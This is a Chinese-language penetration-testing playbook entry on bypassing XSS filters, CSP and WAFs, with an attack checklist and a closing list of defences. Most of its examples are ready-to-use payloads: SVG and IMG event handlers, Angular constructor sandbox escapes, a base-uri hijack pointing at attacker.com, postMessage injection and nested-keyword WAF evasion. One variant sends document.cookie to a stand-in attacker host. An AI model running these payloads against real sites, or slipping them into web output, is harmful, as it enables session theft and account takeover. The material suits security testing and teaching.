# XSS Filter Bypass Techniques

**ID**: `web-xss-001` | **分类**: web | **风险等级**: critical

XSS 过滤器绕过技术用于在目标系统部署了 XSS 过滤器、CSP 策略或 WAF 防护时，通过利用 HTML 解析差异、事件处理器变体、CSP 策略缺陷、前端框架模板解析特性等手段绕过防护成功执行跨站脚本。现代防护层通常聚焦于 <script> 标签和 onerror/onload 等常见事件，但 HTML 规范提供了数十种事件处理器和标签组合，结合上下文差异（属性值、URL、JS 字符串）可构造多种绕过方式。

## 触发场景

- 目标页面存在用户输入反射但未触发经典 XSS payload
- CSP 策略限制了内联脚本执行但仍存在反射点
- WAF 拦截 <script> 标签但其他 HTML 上下文未覆盖
- 输入被 HTML 实体编码但在特定上下文中仍可执行
- 前端框架 (Angular/React/Vue) 模板中用户可控数据
- DOM 型 XSS 中数据流从 source 到 sink 未经正确编码

## 操作检查清单

1. 识别 XSS 类型（反射型、存储型、DOM 型）和注入上下文
2. 分析 CSP 策略（script-src、object-src、base-uri、default-src 等）
3. 确定输入被编码/过滤的方式（HTML 实体、URL 编码、关键字删除 等）
4. 测试 SVG/MathML 标签和事件处理器绕过
5. 测试 DOM XSS source（location、URL、postMessage、localStorage 等）
6. 尝试编码绕过（HTML 实体、Unicode、Hex、JS 八进制）
7. 针对 CSP 绕过测试：nonce 复用、base-uri 劫持、JSONP 端点
8. 前端框架特定测试：Angular sandbox、React dangerouslySetInnerHTML
9. 验证 payload 在目标浏览器中是否实际执行

## 技术手段

- SVG 事件处理器：<svg onload=alert(1)> 或 <svg><animate onbegin=alert(1)>
- IMG 标签绕过：<img src=x onerror=alert(1)> 或 <img src=1 onerror=alert(1)>
- 冷门事件处理器：ontoggle、onanimationend、ontransitionend、onfocusin
- CSP unsafe-inline 利用：直接执行内联脚本
- CSP base-uri 劫持：修改相对路径脚本的加载源
- CSP script-src 宽松策略利用：利用 JSONP 端点或 CDN 白名单
- Angular 模板注入：{{constructor.constructor('alert(1)')()}}
- DOMPurify 绕过：利用已公开的绕过 payload（版本相关）
- HTML 实体编码绕过：&#97;lert(1)（部分解析器会解码）
- JS Unicode 编码：\u0061lert(1) 在 JS 上下文中有效

## 症状

- 经典 <script>alert(1)</script> 被过滤或转义
- 输入被 HTML 实体编码但出现在 JS 字符串上下文中
- CSP 存在 nonce 或 hash 但可预测/可复用
- WAF 拦截关键字 script、alert 但放行等效表达式
- DOM XSS 中 location.hash、document.URL 等 source 被直接用作 innerHTML

## 根因分析

- 过滤器基于黑名单匹配，无法覆盖所有 HTML 标签和事件组合
- CSP 策略中使用了 unsafe-inline、unsafe-eval 或过于宽松的 script-src
- 前端框架模板绑定 (v-html, dangerouslySetInnerHTML) 绕过了框架自带的 XSS 防护
- HTML 解析器在不同上下文（标签内、属性内、注释内）行为差异未被正确处理
- DOM 型 XSS 中数据流从 source（如 location）到 sink（如 eval）未经编码
- WAF 只检测请求层 payload，不检查 DOM 层数据流

## 示例

### SVG onload 事件绕过 WAF

利用 SVG 标签和 onload 事件执行 JS，绕过对 <script> 标签的检测

```
原始 payload: <script>alert(1)</script>
绕过 payload: <svg onload=alert(1)>
变体: <svg><script>alert(1)</script></svg>
变体: <svg><animate onbegin=alert(1) attributeName=x dur=1s>
变体: <svg><set onbegin=alert(1) attributeName=x to=1>
原理: WAF 通常对 <script> 严格检测，但 SVG 标签在 HTML 上下文中被放行
     SVG 支持事件处理器和嵌套 <script> 标签
适用: 适用于 WAF 只检测 <script> 和常见 onerror/onload 的场景
```

### IMG 标签事件处理器绕过

利用 <img> 标签的 onerror 等事件处理器执行 XSS

```
原始 payload: <script>alert(1)</script>
绕过 payload: <img src=x onerror=alert(1)>
变体: <img src=1 onerror=alert(1)>
变体: <img src=x onerror="fetch('https://attacker.com/?c='+document.cookie)">
变体: <img src=x:alert(alt) onerror=eval(src) alt=1>
原理: 无效的图片源触发 onerror 事件，<img> 标签极少被 WAF 拦截
适用: 几乎所有 XSS 场景，是最经典的绕过方式之一
```

### CSP unsafe-inline 策略绕过

当 CSP 包含 script-src 'unsafe-inline' 时，直接执行内联脚本

```
目标 CSP: Content-Security-Policy: default-src 'self'; script-src 'self' 'unsafe-inline'
利用方式: 任何内联脚本均可执行
Payload: <script>alert(document.domain)</script>
Payload: <img src=x onerror=alert(1)>
原理: unsafe-inline 允许所有内联脚本执行，等价于无 CSP 脚本防护
     这是最常见的 CSP 配置错误
适用: 任何存在 unsafe-inline 的 CSP 策略
```

### CSP base-uri 劫持绕过

当 CSP 未限制 base-uri 时，通过 <base> 标签劫持相对路径脚本加载

```
目标 CSP: Content-Security-Policy: script-src 'nonce-abc123'
（未限制 base-uri，页面使用相对路径加载脚本）
利用方式: <base href="https://attacker.com/">
原理: <base> 标签改变相对 URL 的基准地址
     页面中的 <script src="js/app.js"> 将加载 https://attacker.com/js/app.js
     攻击者可控制返回的 JS 代码
修复: CSP 中添加 base-uri 'self' 或 base-uri 'none'
适用: 页面使用相对路径加载脚本且 CSP 未限制 base-uri
```

### Angular 模板注入 XSS

利用 Angular 模板表达式绕过 CSP 和执行 XSS

```
原始 payload: <script>alert(1)</script>（被 CSP 或 WAF 拦截）
AngularJS 1.x Payload: {{constructor.constructor('alert(1)')()}}
AngularJS 1.x Payload: {{$on.constructor('alert(1)')()}}
Angular 2+ Payload: 需要访问组件方法，如 {{this.constructor.constructor}}
原理: Angular 模板表达式在沙箱中求值，但可通过 constructor 访问 Function 构造函数
     Angular 2+ 沙箱已移除，但仍可通过模板注入执行代码
适用: Angular/AngularJS 应用中用户数据被渲染为模板
```

### DOM XSS 通过 postMessage 数据流

利用 postMessage 传递恶意数据到 DOM sink 实现 XSS

```
Source: window.addEventListener('message', function(e) {
  document.getElementById('output').innerHTML = e.data;
});
攻击 Payload: <iframe src="https://victim.com" onload="this.contentWindow.postMessage('<img src=x onerror=alert(1)>', '*')">
原理: postMessage 未验证 origin，恶意数据直接流入 innerHTML
     其他常见 source: location.hash、document.referrer、URL 参数
     其他常见 sink: innerHTML、outerHTML、document.write、eval
适用: 页面通过 postMessage 接收数据并直接渲染到 DOM
```

### WAF 关键字删除绕过

WAF 删除 script 关键字后，嵌套拼接形成有效 payload

```
WAF 行为: 删除 'script' 关键字
Payload: <scr<script>ipt>alert(1)</scr</script>ipt>
WAF 处理后: <script>alert(1)</script>
原理: WAF 单次扫描删除 script 后，剩余部分拼接成完整标签
     类似技巧可用于其他被删除的关键字
变体: 针对 onerror 过滤: <img src=x ononerrorerror=alert(1)>
适用: WAF 采用关键字删除（而非拦截）策略
```

### React dangerouslySetInnerHTML 绕过

利用 React 的 dangerouslySetInnerHTML 执行 XSS

```
漏洞代码: <div dangerouslySetInnerHTML={{__html: userInput}} />
Payload: <img src=x onerror=alert(1)>
Payload: <svg onload=alert(1)>
原理: dangerouslySetInnerHTML 跳过 React 的 XSS 防护直接渲染 HTML
     即使 React 对 JSX 中的 HTML 进行编码，此 API 会绕过编码
     需配合服务端未正确净化输入使用
适用: React 应用中使用 dangerouslySetInnerHTML 渲染用户输入
```

## 成功标志

- alert/confirm/prompt 弹窗出现
- 攻击者服务器收到外带数据（cookie、DOM 内容 等）
- 控制台无 CSP 违规错误
- 恶意脚本在页面上下文中执行（可访问 document、window 等）
- DOM 结构被成功修改

## 防御建议

- 使用输出编码（Output Encoding）：HTML body 用 HTML 实体编码，属性值用属性编码，JS 上下文用 JS 编码
- 实施严格的 CSP：script-src 'strict-dynamic' 或基于 nonce/hash，禁止 unsafe-inline/unsafe-eval
- CSP 中限制 base-uri、object-src、form-action 等指令
- 使用现代前端框架的数据绑定，避免 v-html、dangerouslySetInnerHTML、innerHTML
- 对 postMessage 事件验证 source origin
- 部署 DOMPurify 等 HTML 净化库并保持最新版本
- 对所有用户输入进行白名单验证而非黑名单过滤
